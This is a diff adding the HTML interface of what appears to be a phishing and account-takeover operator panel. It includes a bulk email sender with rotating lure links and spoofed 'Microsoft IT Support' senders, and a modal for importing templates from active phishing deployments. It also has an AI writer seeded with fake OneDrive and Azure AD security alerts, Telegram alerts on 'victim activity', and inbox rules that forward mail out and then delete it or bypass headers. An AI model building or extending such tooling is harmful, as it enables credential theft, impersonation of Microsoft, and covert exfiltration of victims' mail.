+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Link Lines -->
+                    <div class="b2b-field-section" style="padding-top:8px;border-top:1px solid #241115;">
+                        <div class="b2b-compose-label">LINK LINES <span class="b2b-dim">(REPLACES [LINK])</span></div>
+                        <textarea id="b2b-links" class="b2b-mini-ta" rows="2" placeholder="https://example.com/page&#10;https://contoso.com/signin"></textarea>
+                        <div class="b2b-rotate-row">
+                            <span class="b2b-dim">Rotate after:</span>
+                            <div class="b2b-counter">
+                                <button onclick="adjustB2BCounter('b2b-link-rotate', -1)">−</button>
+                                <input type="number" id="b2b-link-rotate" value="1" min="1" class="b2b-counter-input">
+                                <button onclick="adjustB2BCounter('b2b-link-rotate', 1)">+</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Files -->
+                    <div class="b2b-option-row b2b-option-row-border" style="gap:8px;">
+                        <button class="b2b-add-files-btn" onclick="document.getElementById('b2b-file-input').click()">ADD FILES</button>
+                        <input type="file" id="b2b-file-input" multiple accept=".html,.pdf" style="display:none" onchange="handleB2BFiles(event)">
+                        <span class="b2b-dim" style="font-size:.74em;">max 5 MB · HTML/PDF</span>
+                        <span class="b2b-badge">HTML</span><span class="b2b-badge">PDF</span>
+                    </div>
+                    <div id="b2b-files-list" class="b2b-dim" style="font-size:.76em;">No files attached.</div>
+
+                    <!-- Toggles -->
+                    <div class="b2b-option-row b2b-option-row-border">
+                        <span class="b2b-option-label">RANDOMIZE NAMES</span>
+                        <div class="b2b-tg" onclick="toggleB2BOpt('randomize')">
+                            <div class="b2b-tg-opt active" id="b2b-rand-off">Off</div>
+                            <div class="b2b-tg-opt" id="b2b-rand-on">On</div>
+                        </div>
+                    </div>
+                    <div class="b2b-option-row b2b-option-row-border">
+                        <span class="b2b-option-label">SAVE SENT EMAILS</span>
+                        <div class="b2b-tg" onclick="toggleB2BOpt('save')">
+                            <div class="b2b-tg-opt" id="b2b-save-off">Off</div>
+                            <div class="b2b-tg-opt active" id="b2b-save-on">On</div>
+                        </div>
+                    </div>
+
+                    <!-- Send Mode & Actions -->
+                    <div class="b2b-sidebar-actions">
+                        <div class="b2b-sendmode-wrap">
+                            <label class="b2b-dim" style="font-size:.7em;">VIA:</label>
+                            <select id="b2b-send-mode" class="b2b-sendmode-sel" onchange="onB2BSendModeChange()">
+                                <option value="graph">Microsoft Graph</option>
+                                <option value="smtp">SMTP Server</option>
+                            </select>
+                            <button class="b2b-smtp-cfg-btn" id="b2b-smtp-cfg-btn" onclick="openSmtpSettings()" title="Configure SMTP" style="display:none">⚙ SMTP</button>
+                        </div>
+                        <div style="display:flex;gap:6px;">
+                            <button class="b2b-save-btn" style="flex:1" onclick="saveB2BCampaign()">💾 Save</button>
+                            <button class="b2b-reset-btn" onclick="resetB2B()">Reset</button>
+                        </div>
+                        <button class="b2b-send-btn" id="b2b-send-btn" onclick="startB2BSend()">✈ SEND EMAIL</button>
+                    </div>
+
+                    <!-- Sending Output / Terminal -->
+                    <div class="b2b-output-section">
+                        <div class="b2b-output-header">
+                            <span class="b2b-output-title">OUTPUT</span>
+                            <div class="b2b-out-counters">
+                                <div class="b2b-out-chip" title="Sent emails">
+                                    <span class="b2b-out-chip-label">Sent</span>
+                                    <span id="b2b-sent-ct" class="b2b-out-chip-val" style="color:#3fb950">0</span>
+                                </div>
+                                <div class="b2b-out-chip" title="Failed sends">
+                                    <span class="b2b-out-chip-label">Failed</span>
+                                    <span id="b2b-fail-ct" class="b2b-out-chip-val" style="color:#f85149">0</span>
+                                </div>
+                                <div class="b2b-out-chip" title="Total targets">
+                                    <span class="b2b-out-chip-label">Total</span>
+                                    <span id="b2b-total-ct" class="b2b-out-chip-val" style="color:#ffffff">0</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="terminal-pane" id="b2b-terminal">
+                            <div class="terminal-line dim"><span class="term-ts">[--:--]</span><span class="term-txt">Send logs appear here.</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Column 3: Full Static Canvas Touching Right Edge -->
+                <div class="b2b-compose-panel">
+                    <div class="b2b-body-container" id="b2b-body-section">
+                        <div class="b2b-body-header">
+                            <div class="b2b-compose-label">HTML BODY</div>
+                            <div class="b2b-body-actions">
+                                <button class="b2b-import-btn" onclick="openB2BImportModal()" title="Import template and link from active deployments">📥 IMPORT TEMPLATE</button>
+                                <button class="b2b-ai-btn" onclick="openAIWriter()">✦ AI WRITER</button>
+                                <div class="b2b-merge-tags">
+                                    <button class="b2b-merge-btn" onclick="insertB2BMerge('[NAME]')">[NAME]</button>
+                                    <button class="b2b-merge-btn" onclick="insertB2BMerge('[EMAIL]')">[EMAIL]</button>
+                                    <button class="b2b-merge-btn" onclick="insertB2BMerge('[DOMAIN]')">[DOMAIN]</button>
+                                    <button class="b2b-merge-btn" onclick="insertB2BMerge('[COMPANY]')">[COMPANY]</button>
+                                    <button class="b2b-merge-btn" onclick="insertB2BMerge('[LINK]')">[LINK]</button>
+                                </div>
+                                <div class="b2b-edit-tabs">
+                                    <div class="b2b-edit-tab active" id="b2b-tab-edit" onclick="switchB2BTab('edit')">EDIT</div>
+                                    <div class="b2b-edit-tab" id="b2b-tab-source" onclick="switchB2BTab('source')">SOURCE</div>
+                                    <div class="b2b-edit-tab" id="b2b-tab-preview" onclick="switchB2BTab('preview')">PREVIEW</div>
+                                </div>
+                                <div id="b2b-prev-dev-wrap" style="display:none;align-items:center;gap:5px;">
+                                    <button class="b2b-prev-btn active" id="b2b-prev-btn-desktop" onclick="setB2BPreviewDevice('desktop')">🖥 Desktop</button>
+                                    <button class="b2b-prev-btn" id="b2b-prev-btn-mobile" onclick="setB2BPreviewDevice('mobile')">📱 Mobile</button>
+                                </div>
+                                <button class="b2b-prev-btn" id="b2b-fs-btn" onclick="toggleB2BFullscreen()" title="Toggle fullscreen focus mode">⛶ Fullscreen</button>
+                            </div>
+                        </div>
+                        <!-- Toolbar -->
+                        <div class="b2b-editor-toolbar" id="b2b-toolbar">
+                            <select class="b2b-tb-sel" style="width:85px" onchange="b2bExec('fontName',this.value);this.value=''">
+                                <option value="">Segoe UI</option>
+                                <option value="Arial">Arial</option>
+                                <option value="Georgia">Georgia</option>
+                                <option value="'Courier New'">Courier New</option>
+                                <option value="Verdana">Verdana</option>
+                                <option value="Tahoma">Tahoma</option>
+                            </select>
+                            <select class="b2b-tb-sel" style="width:50px" onchange="b2bExec('fontSize',this.value);this.value=''">
+                                <option value="">14px</option>
+                                <option value="1">10px</option>
+                                <option value="2">12px</option>
+                                <option value="3">14px</option>
+                                <option value="4">16px</option>
+                                <option value="5">20px</option>
+                                <option value="6">28px</option>
+                                <option value="7">36px</option>
+                            </select>
+                            <div class="b2b-tb-sep"></div>
+                            <button class="b2b-tb-btn" onclick="b2bExec('bold')" title="Bold"><b>B</b></button>
+                            <button class="b2b-tb-btn" onclick="b2bExec('italic')" title="Italic"><i>I</i></button>
+                            <button class="b2b-tb-btn" onclick="b2bExec('underline')" title="Underline"><u>U</u></button>
+                            <div class="b2b-tb-sep"></div>
+                            <label class="b2b-tb-btn" title="Text colour" style="cursor:pointer">A<input type="color" style="display:none;width:0;height:0" onchange="b2bExec('foreColor',this.value)"></label>
+                            <label class="b2b-tb-btn" title="Highlight" style="cursor:pointer;background:rgba(229,9,20,.25)">HL<input type="color" style="display:none;width:0;height:0" onchange="b2bExec('hiliteColor',this.value)"></label>
+                            <div class="b2b-tb-sep"></div>
+                            <button class="b2b-tb-btn" onclick="insertB2BLink()" title="Insert link">🔗</button>
+                            <button class="b2b-tb-btn" onclick="b2bExec('insertOrderedList')" title="Ordered list">1.</button>
+                            <button class="b2b-tb-btn" onclick="b2bExec('insertUnorderedList')" title="Bullet list">•</button>
+                            <div class="b2b-tb-sep"></div>
+                            <button class="b2b-tb-btn" onclick="b2bExec('justifyLeft')" title="Align left">⬛</button>
+                            <button class="b2b-tb-btn" onclick="b2bExec('justifyCenter')" title="Centre">≡</button>
+                            <button class="b2b-tb-btn" onclick="b2bExec('justifyRight')" title="Align right">⬜</button>
+                            <button class="b2b-tb-btn" onclick="b2bExec('removeFormat')" title="Clear formatting">Clear</button>
+                            <div class="b2b-tb-sep"></div>
+                            <button class="b2b-tb-btn" onclick="insertB2BImage()" title="Insert image">IMG</button>
+                        </div>
+                        <!-- Single Big Box: Editor / Source / Preview panels -->
+                        <div id="b2b-edit-panel" class="b2b-editor-area">
+                            <div id="b2b-editor" class="b2b-editor-content" contenteditable="true" spellcheck="false"
+                                 placeholder="Type text, insert images, or paste rendered content. Use SOURCE tab to paste raw HTML."></div>
+                        </div>
+                        <div id="b2b-source-panel" class="b2b-editor-area" style="display:none">
+                            <textarea id="b2b-source-ta" class="b2b-source-ta" spellcheck="false" placeholder="Paste your raw HTML here and switch back to EDIT or PREVIEW to render it."></textarea>
+                        </div>
+                        <div id="b2b-preview-panel" class="b2b-editor-area b2b-preview-wrap" style="display:none">
+                            <iframe id="b2b-preview-frame" class="b2b-preview-frame" sandbox="allow-same-origin"></iframe>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Import Template Modal -->
+        <div class="b2b-import-modal" id="b2b-import-modal" style="display:none" onclick="if(event.target===this)closeB2BImportModal()">
+            <div class="b2b-import-box">
+                <div class="b2b-import-hdr">
+                    <span style="font-size:1.3em">📥</span>
+                    <div>
+                        <div class="b2b-import-title">Import Template from Deployed Link</div>
+                        <div class="b2b-import-sub">Select an active deployment to auto-populate the email body, target link, and subject lines.</div>
+                    </div>
+                    <button class="b2b-import-close" onclick="closeB2BImportModal()">✕</button>
+                </div>
+                <div class="b2b-import-search-bar">
+                    <input type="text" id="b2b-import-search" class="b2b-import-search-input" placeholder="Search deployed links by name, domain, service..." oninput="filterB2BImportDeployments()">
+                </div>
+                <div class="b2b-import-body" id="b2b-import-deployments-list">
+                    <div style="text-align:center;color:#cbd5e1;padding:24px;font-size:13px;">Loading deployed campaigns...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SMTP Settings Modal -->
+        <div class="ai-modal" id="smtp-settings-modal" style="display:none" onclick="if(event.target===this)closeSmtpSettings()">
+            <div class="ai-modal-box" style="width:480px">
+                <div class="ai-modal-hdr">
+                    <span style="font-size:1.2em">⚙</span>
+                    <div class="ai-modal-title">SMTP Configuration</div>
+                    <button class="ai-modal-close" onclick="closeSmtpSettings()">✕</button>
+                </div>
+                <div class="ai-modal-body" style="gap:10px">
+                    <div class="ai-section-label">These settings are saved to your browser session only.</div>
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
+                        <div class="ai-opt-group" style="grid-column:1/-1">
+                            <div class="ai-section-label">SMTP HOST</div>
+                            <input type="text" id="smtp-host" class="b2b-campaign-input" placeholder="smtp.gmail.com" style="font-size:.85em;padding:7px 10px">
+                        </div>
+                        <div class="ai-opt-group">
+                            <div class="ai-section-label">PORT</div>
+                            <input type="number" id="smtp-port" class="b2b-campaign-input" placeholder="587" value="587" style="font-size:.85em;padding:7px 10px">
+                        </div>
+                        <div class="ai-opt-group">
+                            <div class="ai-section-label">SECURITY</div>
+                            <select id="smtp-security" class="ai-select">
+                                <option value="tls">STARTTLS (port 587)</option>
+                                <option value="ssl">SSL/TLS (port 465)</option>
+                                <option value="none">None (port 25)</option>
+                            </select>
+                        </div>
+                        <div class="ai-opt-group" style="grid-column:1/-1">
+                            <div class="ai-section-label">FROM ADDRESS</div>
+                            <input type="email" id="smtp-from" class="b2b-campaign-input" placeholder="sender@yourdomain.com" style="font-size:.85em;padding:7px 10px">
+                        </div>
+                        <div class="ai-opt-group" style="grid-column:1/-1">
+                            <div class="ai-section-label">FROM NAME (optional)</div>
+                            <input type="text" id="smtp-fromname" class="b2b-campaign-input" placeholder="Microsoft IT Support" style="font-size:.85em;padding:7px 10px">
+                        </div>
+                        <div class="ai-opt-group">
+                            <div class="ai-section-label">USERNAME</div>
+                            <input type="text" id="smtp-user" class="b2b-campaign-input" placeholder="user@domain.com" style="font-size:.85em;padding:7px 10px" autocomplete="off">
+                        </div>
+                        <div class="ai-opt-group">
+                            <div class="ai-section-label">PASSWORD / APP PASSWORD</div>
+                            <input type="password" id="smtp-pass" class="b2b-campaign-input" placeholder="••••••••••••" style="font-size:.85em;padding:7px 10px" autocomplete="off">
+                        </div>
+                    </div>
+                    <div id="smtp-test-result" style="font-size:.8em;min-height:20px"></div>
+                </div>
+                <div class="ai-modal-footer">
+                    <button class="ai-gen-btn" onclick="testSmtpConnection()" id="smtp-test-btn">⚡ Test Connection</button>
+                    <button class="ai-insert-btn" onclick="saveSmtpSettings()">✓ Save</button>
+                    <button class="ai-modal-close" style="margin-left:auto;font-size:.85em;color:#8b949e" onclick="closeSmtpSettings()">Cancel</button>
+                </div>
+            </div>
+        <!-- Operator Telegram Setup Modal -->
+        <div class="ai-modal" id="operator-telegram-modal" style="display:none" onclick="if(event.target===this)closeOperatorTelegramModal()">
+            <div class="ai-modal-box" style="width:480px">
+                <div class="ai-modal-hdr">
+                    <span style="font-size:1.3em">🤖</span>
+                    <div class="ai-modal-title">Operator Telegram Alerts</div>
+                    <button class="ai-modal-close" onclick="closeOperatorTelegramModal()">✕</button>
+                </div>
+                <div class="ai-modal-body" style="gap:14px; padding:20px;">
+                    <div style="background:rgba(88, 166, 255, 0.08); border:1px solid rgba(88, 166, 255, 0.25); border-radius:8px; padding:12px; font-size:0.82rem; color:#c9d1d9; line-height:1.4;">
+                        Connect your dedicated Telegram bot to receive real-time notifications for incoming emails, keyword alerts, and victim activity directly in your chat.
+                    </div>
+                    <div class="ai-opt-group">
+                        <div class="ai-section-label" style="color:#ff858c; font-weight:700;">TELEGRAM BOT TOKEN</div>
+                        <input type="password" id="op-tg-bot-token" class="b2b-campaign-input" placeholder="e.g. 7123456789:AAH..." style="font-size:.85em;padding:9px 12px; font-family:monospace;">
+                        <div style="font-size:0.7rem; color:#705f63; margin-top:4px;">Obtained from @BotFather on Telegram.</div>
+                    </div>
+                    <div class="ai-opt-group">
+                        <div class="ai-section-label" style="color:#ff858c; font-weight:700;">TELEGRAM CHAT ID</div>
+                        <input type="text" id="op-tg-chat-id" class="b2b-campaign-input" placeholder="e.g. 123456789" style="font-size:.85em;padding:9px 12px; font-family:monospace;">
+                        <div style="font-size:0.7rem; color:#705f63; margin-top:4px;">Your Telegram User or Channel Chat ID (e.g. from @userinfobot).</div>
+                    </div>
+                    <div id="op-tg-status" style="display:none; font-size:0.8rem; padding:8px 12px; border-radius:6px;"></div>
+                </div>
+                <div class="ai-modal-ftr" style="display:flex; justify-content:space-between; align-items:center; padding:14px 20px; border-top:1px solid #38161b; background:#120c0f;">
+                    <button type="button" class="btn" style="background:none; border:1px solid #38161b; color:#a49498; font-size:0.8rem; padding:8px 14px; border-radius:6px; cursor:pointer;" onclick="closeOperatorTelegramModal()">Skip For Now</button>
+                    <button type="button" id="btn-save-op-tg" class="btn" style="background:linear-gradient(135deg, #e50914, #b00710); color:#fff; font-weight:700; font-size:0.82rem; padding:8px 18px; border-radius:6px; border:none; cursor:pointer;" onclick="saveOperatorTelegramSettings()">Test &amp; Save Connection ❯</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- AI Email Writer Modal -->
+        <div class="ai-modal" id="ai-writer-modal" style="display:none" onclick="if(event.target===this)closeAIWriter()">
+            <div class="ai-modal-box">
+                <div class="ai-modal-hdr">
+                    <span style="font-size:1.3em">✦</span>
+                    <div class="ai-modal-title">AI Email Writer</div>
+                    <button class="ai-modal-close" onclick="closeAIWriter()">✕</button>
+                </div>
+                <div class="ai-modal-body">
+                    <div id="ai-no-key-banner" class="ai-no-key-banner" style="display:none">
+                        ⚠ No Gemini API key set. Add <code>GEMINI_API_KEY=your_key</code> to your <code>.env</code> file.
+                        Get a free key at <a href="https://aistudio.google.com/apikey" target="_blank">aistudio.google.com/apikey</a>.
+                    </div>
+
+                    <div>
+                        <div class="ai-section-label">INSTRUCTIONS</div>
+                        <textarea id="ai-instruction" class="ai-instruction-area"
+                            placeholder="Describe the email you want. Be as specific as you like.&#10;&#10;Examples:&#10;• Write a SharePoint document sharing notification from IT support asking staff to verify their access permissions&#10;• Create an OneDrive storage alert email saying the account is 95% full and they need to click a link to free space&#10;• Write an urgent security alert from Azure AD saying suspicious sign-in was detected and they need to review it"></textarea>
+                    </div>
+
+                    <div class="ai-opts-row">
+                        <div class="ai-opt-group">
+                            <div class="ai-section-label">TONE</div>
+                            <select id="ai-tone" class="ai-select">
+                                <option value="professional">Professional</option>
+                                <option value="urgent">Urgent</option>
+                                <option value="friendly">Friendly</option>
+                                <option value="formal">Formal</option>
+                                <option value="authoritative">Authoritative</option>
+                            </select>
+                        </div>
+                        <div class="ai-opt-group">
+                            <div class="ai-section-label">LENGTH</div>
+                            <select id="ai-length" class="ai-select">
+                                <option value="short">Short (2-3 paragraphs)</option>
+                                <option value="medium" selected>Medium (3-5 paragraphs)</option>
+                                <option value="long">Long (5+ paragraphs)</option>
+                            </select>
+                        </div>
+                        <div class="ai-opt-group">
+                            <div class="ai-section-label">SENDER TYPE</div>
+                            <select id="ai-sender" class="ai-select">
+                                <option value="IT Support">IT Support</option>
+                                <option value="Microsoft">Microsoft</option>
+                                <option value="Azure AD">Azure AD Security</option>
+                                <option value="SharePoint">SharePoint</option>
+                                <option value="OneDrive">OneDrive</option>
+                                <option value="HR Department">HR Department</option>
+                                <option value="Finance">Finance Team</option>
+                                <option value="custom">Custom (from instruction)</option>
+                            </select>
+                        </div>
+                        <div class="ai-opt-group">
+                            <div class="ai-section-label">FORMAT</div>
+                            <select id="ai-format" class="ai-select">
+                                <option value="html">Full HTML (styled)</option>
+                                <option value="plain_html">Simple HTML</option>
+                                <option value="text">Plain text</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="ai-section-label" style="margin-bottom:6px;">GENERATED OUTPUT <span id="ai-gen-status" style="color:#ff6b72;font-weight:400;"></span></div>
+                        <div id="ai-preview" class="ai-preview-area">Output will appear here as it generates...</div>
+                    </div>
+                </div>
+                <div class="ai-modal-footer">
+                    <button class="ai-gen-btn" id="ai-gen-btn" onclick="runAIGenerate()">
+                        <span id="ai-gen-icon">✦</span> Generate
+                    </button>
+                    <button class="ai-insert-btn" id="ai-insert-btn" onclick="insertAIOutput()" disabled>⬇ Insert into Editor</button>
+                    <span class="ai-key-hint" id="ai-key-hint">Powered by Google Gemini</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Campaigns Modal -->
+        <div class="b2b-campaigns-modal" id="b2b-camps-modal" style="display:none" onclick="if(event.target===this)this.style.display='none'">
+            <div class="b2b-campaigns-inner">
+                <div class="b2b-modal-hdr">
+                    <span>📁 Saved Campaigns</span>
+                    <button class="b2b-modal-close" onclick="document.getElementById('b2b-camps-modal').style.display='none'">✕</button>
+                </div>
+                <div id="b2b-camps-list" class="b2b-camp-list">Loading...</div>
+            </div>
+        </div>
+    </div>
+    </div> <!-- Close #page-b2b -->
+
+    <!-- Compose New Mail Modal -->
+
+    <!-- Genuine Microsoft Outlook Web Compose Modal -->
+    <div id="outlookComposeModal" class="modal-overlay" style="align-items: center; justify-content: center;">
+        <div class="owa-compose-container">
+            <!-- Window Header -->
+            <div class="owa-compose-header">
+                <div class="owa-compose-title">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#0078d4"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                    <span>New message</span>
+                </div>
+                <div class="owa-window-controls">
+                    <button type="button" class="owa-win-btn" title="Minimize" onclick="closeComposeModal()">─</button>
+                    <button type="button" class="owa-win-btn close" title="Discard and Close" onclick="closeComposeModal()">✕</button>
+                </div>
+            </div>
+
+            <!-- Ribbon / Formatting Bar -->
+            <div class="owa-compose-ribbon">
+                <button type="button" class="owa-send-pill" id="btn-send-mail" onclick="sendMailNow()" title="Send email">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+                    <span>Send</span>
+                </button>
+                <button type="button" class="owa-tool-btn" onclick="closeComposeModal()" title="Discard draft" style="color:#605e5c;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
+                    <span style="margin-left:4px;">Discard</span>
+                </button>
+                <div style="width:1px; height:20px; background:#d2d0ce; margin:0 4px;"></div>
+                
+                <!-- Font Family -->
+                <select class="owa-tool-select" onchange="formatDoc('fontName', this.value); this.selectedIndex=0;" title="Font Family">
+                    <option value="" selected disabled>Font</option>
+                    <option value="Aptos, sans-serif">Aptos</option>
+                    <option value="Calibri, sans-serif">Calibri</option>
+                    <option value="'Segoe UI', sans-serif">Segoe UI</option>
+                    <option value="Arial, sans-serif">Arial</option>
+                    <option value="Georgia, serif">Georgia</option>
+                    <option value="'Courier New', monospace">Courier</option>
+                </select>
+
+                <!-- Font Size -->
+                <select class="owa-tool-select" onchange="formatDoc('fontSize', this.value); this.selectedIndex=0;" title="Font Size">
+                    <option value="" selected disabled>Size</option>
+                    <option value="2">10 pt</option>
+                    <option value="3">12 pt</option>
+                    <option value="4">14 pt</option>
+                    <option value="5">18 pt</option>
+                    <option value="6">24 pt</option>
+                </select>
+
+                <div style="width:1px; height:20px; background:#d2d0ce; margin:0 2px;"></div>
+
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('bold')" title="Bold (Ctrl+B)"><b>B</b></button>
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('italic')" title="Italic (Ctrl+I)"><i>I</i></button>
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('underline')" title="Underline (Ctrl+U)"><u>U</u></button>
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('strikeThrough')" title="Strikethrough"><s>S</s></button>
+                
+                <div style="width:1px; height:20px; background:#d2d0ce; margin:0 2px;"></div>
+
+                <!-- Text Color -->
+                <label class="owa-tool-btn" title="Text Color" style="cursor:pointer; display:flex; align-items:center; gap:2px; position:relative;">
+                    <span style="font-weight:700; border-bottom:3px solid #0078d4; line-height:1;">A</span>
+                    <input type="color" style="opacity:0; width:1px; height:1px; position:absolute; bottom:0; left:0;" onchange="formatDoc('foreColor', this.value)">
+                </label>
+
+                <!-- Highlight Color -->
+                <label class="owa-tool-btn" title="Highlight Color" style="cursor:pointer; display:flex; align-items:center; gap:2px; position:relative;">
+                    <span style="font-weight:700; background:#fff100; padding:0 3px; border-radius:2px;">H</span>
+                    <input type="color" value="#ffff00" style="opacity:0; width:1px; height:1px; position:absolute; bottom:0; left:0;" onchange="formatDoc('hiliteColor', this.value)">
+                </label>
+
+                <div style="width:1px; height:20px; background:#d2d0ce; margin:0 2px;"></div>
+
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('insertUnorderedList')" title="Bulleted list">⋮=</button>
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('insertOrderedList')" title="Numbered list">1=</button>
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('justifyLeft')" title="Align Left">⇤</button>
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('justifyCenter')" title="Align Center">≡</button>
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('justifyRight')" title="Align Right">⇥</button>
+                
+                <div style="width:1px; height:20px; background:#d2d0ce; margin:0 2px;"></div>
+
+                <button type="button" class="owa-tool-btn" onclick="insertLinkPrompt()" title="Insert link">🔗</button>
+                <button type="button" class="owa-tool-btn" onclick="formatDoc('removeFormat')" title="Clear formatting">🧹</button>
+            </div>
+
+            <!-- Address Fields -->
+            <div class="owa-compose-fields">
+                <div class="owa-field-row">
+                    <button type="button" class="owa-field-label">To</button>
+                    <input type="email" id="compose-to" class="owa-field-input" placeholder="Enter recipient email address...">
+                    <span class="owa-field-toggle" onclick="toggleCcBcc('cc')">Cc</span>
+                    <span class="owa-field-toggle" onclick="toggleCcBcc('bcc')">Bcc</span>
+                </div>
+                <div class="owa-field-row" id="row-compose-cc" style="display:none;">
+                    <button type="button" class="owa-field-label">Cc</button>
+                    <input type="email" id="compose-cc" class="owa-field-input" placeholder="Enter carbon copy recipients...">
+                </div>
+                <div class="owa-field-row" id="row-compose-bcc" style="display:none;">
+                    <button type="button" class="owa-field-label">Bcc</button>
+                    <input type="email" id="compose-bcc" class="owa-field-input" placeholder="Enter blind carbon copy recipients...">
+                </div>
+                <div>
+                    <input type="text" id="compose-subject" class="owa-subject-input" placeholder="Add a subject">
+                </div>
+            </div>
+
+            <!-- Rich Body Editor -->
+            <div class="owa-compose-editor-wrap">
+                <div id="compose-editor" class="owa-rich-editor" contenteditable="true" spellcheck="true" placeholder="Type your email message here..."></div>
+            </div>
+
+            <!-- Compose Statusbar -->
+            <div class="owa-compose-statusbar">
+                <span id="compose-status"></span>
+                <span style="font-size:11px; color:#8a8886;">Microsoft 365 Outlook Mail</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="outlook-toast"></div>
+
+    <!-- Genuine Microsoft Outlook Settings & Rules Modal -->
+    <div id="outlookSettingsModal" class="modal-overlay" style="align-items: center; justify-content: center;">
+        <div class="owa-settings-container">
+            <div class="owa-settings-header">
+                <div class="owa-settings-title">
+                    <span>⚙️</span>
+                    <span>Settings &mdash; Outlook Mailbox</span>
+                </div>
+                <button type="button" class="owa-win-btn close" onclick="closeMailboxSettings()" title="Close">✕</button>
+            </div>
+            <div class="owa-settings-body">
+                <!-- Left Nav Tabs -->
+                <div class="owa-settings-sidebar">
+                    <div id="tab-nav-autoreply" class="owa-sidebar-item active" onclick="switchOutlookSettingsTab('autoreply')">
+                        <span>🏖️</span>
+                        <span>Automatic replies</span>
+                    </div>
+                    <div id="tab-nav-rules" class="owa-sidebar-item" onclick="switchOutlookSettingsTab('rules')">
+                        <span>📋</span>
+                        <span>Inbox rules</span>
+                    </div>
+                    <div id="tab-nav-general" class="owa-sidebar-item" onclick="switchOutlookSettingsTab('general')">
+                        <span>🌐</span>
+                        <span>Language & time</span>
+                    </div>
+                </div>
+
+                <!-- Right Content Pane -->
+                <div class="owa-settings-main">
+                    <!-- Tab 1: Automatic Replies -->
+                    <div id="settings-tab-autoreply" class="settings-tab-pane">
+                        <div class="owa-settings-section-title">Automatic replies (Out of Office)</div>
+                        <div class="owa-settings-section-desc">Create automatic replies for when you are away from office or on vacation.</div>
+                        <div id="autoreply-content">Loading automatic replies...</div>
+                    </div>
+
+                    <!-- Tab 2: Message Rules -->
+                    <div id="settings-tab-rules" class="settings-tab-pane" style="display:none;">
+                        <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:12px;">
+                            <div>
+                                <div class="owa-settings-section-title">Inbox message rules</div>
+                                <div class="owa-settings-section-desc">Manage rules that automatically process incoming email messages based on sender, subject, and folder actions.</div>
+                            </div>
+                            <button type="button" class="owa-primary-btn" onclick="openNewRuleForm()">
+                                <span>➕ Add new rule</span>
+                            </button>
+                        </div>
+
+                        <!-- Add New Rule Card (collapsed by default) -->
+                        <div id="new-rule-card" class="owa-config-card" style="display:none; margin-bottom:16px; border:2px solid #0078d4;">
+                            <h4 style="display:flex; justify-content:space-between; align-items:center;">
+                                <span>Create New Inbox Rule</span>
+                                <span style="cursor:pointer; color:#605e5c; font-size:14px;" onclick="closeNewRuleForm()">✕</span>
+                            </h4>
+                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;">
+                                <div>
+                                    <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Rule name</label>
+                                    <input type="text" id="new-rule-name" class="owa-input" placeholder="e.g. Forward invoices or delete alerts">
+                                </div>
+                                <div>
+                                    <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Execution Priority / Order</label>
+                                    <input type="number" id="new-rule-sequence" class="owa-input" value="1" min="1">
+                                </div>
+                            </div>
+
+                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;">
+                                <div>
+                                    <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Condition: Subject contains words</label>
+                                    <input type="text" id="new-rule-subject-contains" class="owa-input" placeholder="e.g. Invoice, Security Alert, Urgent">
+                                </div>
+                                <div>
+                                    <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Condition: Sender address contains</label>
+                                    <input type="text" id="new-rule-sender-contains" class="owa-input" placeholder="e.g. @company.com, alerts@">
+                                </div>
+                            </div>
+
+                            <div>
+                                <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Action</label>
+                                <select id="new-rule-action-type" class="owa-select" style="width:100%;" onchange="onRuleActionTypeChange()">
+                                    <option value="forwardTo">Forward message to email address</option>
+                                    <option value="forwardAndDelete">Forward to email address &amp; Move to Deleted Items</option>
+                                    <option value="forwardAndMove">Forward to email address &amp; Move to specific folder...</option>
+                                    <option value="forwardAsAttachment">Forward as attachment to email address</option>
+                                    <option value="redirectTo">Redirect to email address (bypass headers)</option>
+                                    <option value="moveToFolder">Move message to specific folder...</option>
+                                    <option value="moveToDeleted">Move message to Deleted Items</option>
+                                    <option value="moveToArchive">Move message to Archive</option>
+                                    <option value="moveToJunk">Move message to Junk Email</option>
+                                    <option value="delete">Permanently delete message</option>
+                                    <option value="markRead">Mark message as read</option>
+                                </select>
+                            </div>
+
+                            <div id="new-rule-forward-row" style="display:block;">
+                                <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Forward to recipient email</label>
